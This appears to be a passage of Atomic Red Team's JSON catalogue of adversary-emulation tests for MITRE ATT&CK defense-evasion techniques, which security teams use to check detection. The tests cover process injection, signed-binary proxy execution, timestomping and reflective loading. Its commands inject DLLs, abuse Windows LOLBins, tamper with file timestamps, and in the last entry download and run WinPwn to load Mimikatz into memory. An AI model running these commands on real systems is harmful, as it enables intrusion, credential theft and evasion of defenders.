"description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n", "supported_platforms": ["windows"], "input_arguments": {"pid": {"description": "Parent process ID", "type": "string", "default": "(Start-Process calc.exe -PassThru).Id"}}, "executor": {"command": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}\n", "cleanup_command": "Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force", "name": "powershell", "elevation_required": false}}, {"name": "Read-Write-Execute process Injection", "auto_generated_guid": "49543237-25db-497b-90df-d0a0a6e8fe2c", "description": "This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.\nThe RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms \nthat relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.\nThe injected shellcode will open a message box and a notepad.\nRWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.\nMore details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.\nThe original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.\n", "supported_platforms": ["windows"], "input_arguments": {"vuln_dll": {"description": "vulnerable DLL", "type": "path", "default": "PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Utility to inject must exist on disk at specified location (#{vuln_dll})\n", "prereq_command": "if (Test-Path \"#{vuln_dll}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{vuln_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/vuln_dll/msys-2.0.dll\" -OutFile \"#{vuln_dll}\"\n"}], "executor": {"command": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address\n", "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "name": "powershell", "elevation_required": true}}]}, "T1218": {"name": "System Binary Proxy Execution", "technique_id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4", "external_id": "T1218", "data_components": ["Network Connection Creation", "File Creation", "Command Execution", "Process Creation", "OS API Execution", "Windows Registry Key Modification", "Module Load"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--d2a24649-9694-4c97-9c62-ce7b270bf6a3", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)", "atomic_tests": [{"name": "mavinject - Inject DLL into running process", "auto_generated_guid": "c426dacf-575d-4937-8611-a148a86a5e61", "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n", "supported_platforms": ["windows"], "input_arguments": {"process_id": {"description": "PID of process receiving injection", "type": "string", "default": "1000"}, "dll_payload": {"description": "DLL to inject", "type": "path", "default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\"\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Register-CimProvider - Execute evil dll", "auto_generated_guid": "ad2c17ed-f626-4061-b21e-b9804a6f3655", "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\"\n", "name": "command_prompt"}}, {"name": "InfDefaultInstall.exe .inf Execution", "auto_generated_guid": "54ad7d5a-a1b5-472c-b6c4-f8090fb2daef", "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_to_execute})\n", "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"command": "InfDefaultInstall.exe \"#{inf_to_execute}\"\n", "name": "command_prompt"}}, {"name": "ProtocolHandler.exe Downloaded a Suspicious File", "auto_generated_guid": "db020456-125b-4c8b-a4a7-487df8afb5a2", "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n", "supported_platforms": ["windows"], "input_arguments": {"remote_url": {"description": "url to document", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft Word must be installed\n", "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n"}}, {"name": "Microsoft.Workflow.Compiler.exe Payload Execution", "auto_generated_guid": "7cbb0f26-a4c1-4f77-b180-a009aa05637e", "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n", "supported_platforms": ["windows"], "input_arguments": {"xml_payload": {"description": "XML to execution", "type": "path", "default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"}, "mwcpath": {"description": "Default location of Microsoft.Workflow.Compiler.exe", "type": "path", "default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"}, "mwcname": {"description": "Default name of microsoft.workflow.compiler.exe", "type": "path", "default": "microsoft.workflow.compiler.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": ".Net must be installed for this test to work correctly.\n", "prereq_command": "if (Test-Path #{mwcpath}\\#{mwcname} ) {exit 0} else {exit 1}\n", "get_prereq_command": "write-host \".Net must be installed for this test to work correctly.\"\n"}], "executor": {"command": "#{mwcpath}\\#{mwcname} \"#{xml_payload}\" output.txt\n", "name": "powershell", "elevation_required": false}}, {"name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "auto_generated_guid": "4cc40fd7-87b8-4b16-b2d7-57534b86b911", "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n", "supported_platforms": ["windows"], "input_arguments": {"xml_payload": {"description": "XML to execution", "type": "path", "default": "PathToAtomicsFolder\\T1218\\src\\T1218.xml"}, "renamed_binary": {"description": "renamed Microsoft.Workflow.Compiler", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\svchost.exe"}, "mwcpath": {"description": "Default location of Microsoft.Workflow.Compiler.exe", "type": "path", "default": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"}, "mwcname": {"description": "Default name of microsoft.workflow.compiler.exe", "type": "path", "default": "microsoft.workflow.compiler.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": ".Net must be installed for this test to work correctly.\n", "prereq_command": "if (Test-Path \"#{renamed_binary}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nCopy-Item #{mwcpath}\\#{mwcname} \"#{renamed_binary}\" -Force\n"}], "executor": {"command": "&\"#{renamed_binary}\" \"#{xml_payload}\" output.txt\n", "name": "powershell", "elevation_required": false}}, {"name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "auto_generated_guid": "9ebe7901-7edf-45c0-b5c7-8366300919db", "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n", "supported_platforms": ["windows"], "input_arguments": {"module_name": {"description": "Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used. A PowerShell module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses module load order, a module name must be specified.", "type": "string", "default": "foo"}, "module_path": {"description": "Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules.", "type": "string", "default": "$PWD"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}", "name": "powershell"}}, {"name": "DiskShadow Command Execution", "auto_generated_guid": "0e1483ba-8f0c-425d-b8c6-42736e058eaa", "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n", "supported_platforms": ["windows"], "input_arguments": {"txt_payload": {"description": "txt to execute", "type": "path", "default": "PathToAtomicsFolder\\T1218\\src\\T1218.txt"}, "dspath": {"description": "Default location of DiskShadow.exe", "type": "path", "default": "C:\\Windows\\System32\\diskshadow.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "txt file must exist on disk at specified location (#{txt_payload})", "prereq_command": "if (Test-Path \"#{txt_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{txt_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt\" -OutFile \"#{txt_payload}\"\n"}, {"description": "DiskShadow.exe must exist on disk at specified location (#{dspath})", "prereq_command": "if (Test-Path #{dspath}) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"DiskShadow.exe not found on disk at expected location\"\n"}], "executor": {"command": "#{dspath} -S #{txt_payload} \n", "name": "powershell", "elevation_required": false}}, {"name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)", "auto_generated_guid": "49fbd548-49e9-4bb7-94a6-3769613912b8", "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n", "supported_platforms": ["windows"], "input_arguments": {"arbitrary_dll": {"description": "Path of DLL to be loaded", "type": "string", "default": "PathToAtomicsFolder\\T1218\\bin\\calc.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n", "prereq_command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{arbitrary_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true\" -OutFile \"#{arbitrary_dll}\"\n"}], "executor": {"command": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer\n", "cleanup_command": "taskkill /f /im calculator.exe > nul 2>&1", "name": "command_prompt"}}, {"name": "Lolbin Gpscript logon option", "auto_generated_guid": "5bcda9cd-8e85-48fa-861d-b5a85d91d48c", "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n", "supported_platforms": ["windows"], "executor": {"command": "Gpscript /logon\n", "name": "command_prompt"}}, {"name": "Lolbin Gpscript startup option", "auto_generated_guid": "f8da74bb-21b8-4af9-8d84-f2c8e4a220e3", "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n", "supported_platforms": ["windows"], "executor": {"command": "Gpscript /startup\n", "name": "command_prompt"}}, {"name": "Lolbas ie4uinit.exe use as proxy", "auto_generated_guid": "13c0804e-615e-43ad-b223-2dfbacd0b0b3", "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n", "supported_platforms": ["windows"], "input_arguments": {"Path_inf": {"description": "Path to the cab file", "type": "path", "default": "PathToAtomicsFolder\\T1218\\src\\ieuinit.inf"}, "Path_ie4uinit": {"description": "Path to ie4uinit.exe", "type": "path", "default": "c:\\windows\\system32\\ie4uinit.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})\n", "prereq_command": "if (Test-Path \"#{Path_inf}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{Path_inf}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf\" -OutFile \"#{Path_inf}\"\n"}], "executor": {"command": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy \"#{Path_inf}\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n", "cleanup_command": "del %TEMP%\\ie4uinit.exe >nul 2>&1\ndel %TEMP%\\ieuinit.inf >nul 2>&1\n", "name": "command_prompt"}}, {"name": "LOLBAS CustomShellHost to Spawn Process", "auto_generated_guid": "b1eeb683-90bb-4365-bbc2-2689015782fe", "description": "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n", "supported_platforms": ["windows"], "input_arguments": {"dest_path": {"description": "Directory to copy files into", "type": "path", "default": "C:\\test"}}, "executor": {"command": "if (-not (Test-Path #{dest_path})) {\nNew-Item -Path #{dest_path} -ItemType Directory\n} else {\nWrite-Host \"Directory #{dest_path} already exists.\" }\nCopy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"#{dest_path}\\customshellhost.exe\" -Force\nCopy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"#{dest_path}\\explorer.exe\" -Force\n#{dest_path}\\customshellhost.exe\n", "cleanup_command": "Remove-Item -Path #{dest_path} -Recurse -Force\n", "name": "powershell", "elevation_required": true}}, {"name": "Provlaunch.exe Executes Arbitrary Command via Registry Key", "auto_generated_guid": "ab76e34f-28bf-441f-a39c-8db4835b89cc", "description": "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.\n", "supported_platforms": ["windows"], "executor": {"command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n", "name": "command_prompt"}}]}, "T1070.006": {"name": "Timestomp", "technique_id": "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611", "external_id": "T1070.006", "data_components": ["File Modification", "File Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)", "atomic_tests": [{"name": "Set a file's access timestamp", "auto_generated_guid": "5f9113d5-ed75-47ed-ba23-ea3573d05810", "description": "Stomps on the access timestamp of a file\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"target_filename": {"description": "Path of file that we are going to stomp on last access time", "type": "path", "default": "/tmp/T1070.006-access.txt"}}, "dependencies": [{"description": "The file must exist in order to be timestomped\n", "prereq_command": "test -e #{target_filename} && exit 0 || exit 1\n", "get_prereq_command": "echo 'T1070.006 file access timestomp test' > #{target_filename}\n"}], "executor": {"command": "touch -a -t 197001010000.00 #{target_filename}\n", "cleanup_command": "rm -f #{target_filename}\n", "name": "sh"}}, {"name": "Set a file's modification timestamp", "auto_generated_guid": "20ef1523-8758-4898-b5a2-d026cc3d2c52", "description": "Stomps on the modification timestamp of a file\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"target_filename": {"description": "Path of file that we are going to stomp on last access time", "type": "path", "default": "/tmp/T1070.006-modification.txt"}}, "dependencies": [{"description": "The file must exist in order to be timestomped\n", "prereq_command": "test -e #{target_filename} && exit 0 || exit 1\n", "get_prereq_command": "echo 'T1070.006 file modification timestomp test' > #{target_filename}\n"}], "executor": {"command": "touch -m -t 197001010000.00 #{target_filename}\n", "cleanup_command": "rm -f #{target_filename}\n", "name": "sh"}}, {"name": "Set a file's creation timestamp", "auto_generated_guid": "8164a4a6-f99c-4661-ac4f-80f5e4e78d2b", "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"target_filename": {"description": "Path of file that we are going to stomp on last access time", "type": "path", "default": "/tmp/T1070.006-creation.txt"}}, "executor": {"elevation_required": true, "command": "NOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch #{target_filename}\ndate \"$NOW\"\nstat #{target_filename}\n", "cleanup_command": "rm -f #{target_filename}\n", "name": "sh"}}, {"name": "Modify file timestamps using reference file", "auto_generated_guid": "631ea661-d661-44b0-abdb-7a7f3fc08e50", "description": "Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"target_file_path": {"description": "Path of file to modify timestamps of", "type": "path", "default": "/tmp/T1070.006-reference.txt"}, "reference_file_path": {"description": "Path of reference file to read timestamps from", "type": "path", "default": "/bin/sh"}}, "dependencies": [{"description": "The file must exist in order to be timestomped\n", "prereq_command": "test -e #{target_file_path} && exit 0 || exit 1\n", "get_prereq_command": "echo 'T1070.006 reference file timestomp test' > #{target_file_path}\n"}], "executor": {"command": "touch -acmr #{reference_file_path} #{target_file_path}\n", "cleanup_command": "rm -f #{target_file_path}\n", "name": "sh"}}, {"name": "Windows - Modify file creation timestamp with PowerShell", "auto_generated_guid": "b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c", "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n", "supported_platforms": ["windows"], "input_arguments": {"target_date_time": {"description": "Date/time to replace original timestamps with", "type": "string", "default": "01/01/1970 00:00:00"}, "file_path": {"description": "Path of file to change creation timestamp", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "A file must exist at the path (#{file_path}) to change the creation time on\n", "prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"}], "executor": {"command": "Get-ChildItem \"#{file_path}\" | % { $_.CreationTime = \"#{target_date_time}\" }\n", "name": "powershell"}}, {"name": "Windows - Modify file last modified timestamp with PowerShell", "auto_generated_guid": "f8f6634d-93e1-4238-8510-f8a90a20dcf2", "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n", "supported_platforms": ["windows"], "input_arguments": {"target_date_time": {"description": "Date/time to replace original timestamps with", "type": "string", "default": "01/01/1970 00:00:00"}, "file_path": {"description": "Path of file to change modified timestamp", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "A file must exist at the path (#{file_path}) to change the modified time on\n", "prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"}], "executor": {"command": "Get-ChildItem \"#{file_path}\" | % { $_.LastWriteTime = \"#{target_date_time}\" }\n", "name": "powershell"}}, {"name": "Windows - Modify file last access timestamp with PowerShell", "auto_generated_guid": "da627f63-b9bd-4431-b6f8-c5b44d061a62", "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n", "supported_platforms": ["windows"], "input_arguments": {"target_date_time": {"description": "Date/time to replace original timestamps with", "type": "string", "default": "01/01/1970 00:00:00"}, "file_path": {"description": "Path of file to change last access timestamp", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "A file must exist at the path (\"#{file_path}\") to change the last access time on\n", "prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path \"#{file_path}\" -Force | Out-Null\nSet-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n"}], "executor": {"command": "Get-ChildItem \"#{file_path}\" | % { $_.LastAccessTime = \"#{target_date_time}\" }\n", "name": "powershell"}}, {"name": "Windows - Timestomp a File", "auto_generated_guid": "d7512c33-3a75-4806-9893-69abc3ccdd43", "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "File path for timestomp payload", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "timestomp.ps1 must be present in #{file_path}.\n", "prereq_command": "if (Test-Path \"#{file_path}\\timestomp.ps1\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1\" -OutFile \"#{file_path}\\timestomp.ps1\"\n"}, {"description": "kxwn.lock must be present in #{file_path}.\n", "prereq_command": "if (Test-Path -path \"#{file_path}\\kxwn.lock\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path \"#{file_path}\\kxwn.lock\" -ItemType File\n"}], "executor": {"command": "import-module \"#{file_path}\\timestomp.ps1\"\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n", "name": "powershell"}}]}, "T1620": {"name": "Reflective Code Loading", "technique_id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a", "external_id": "T1620", "data_components": ["Module Load", "OS API Execution", "Script Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)", "atomic_tests": [{"name": "WinPwn - Reflectively load Mimik@tz into memory", "auto_generated_guid": "56b9589c-9170-4682-8c3d-33b86ecb5119", "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput 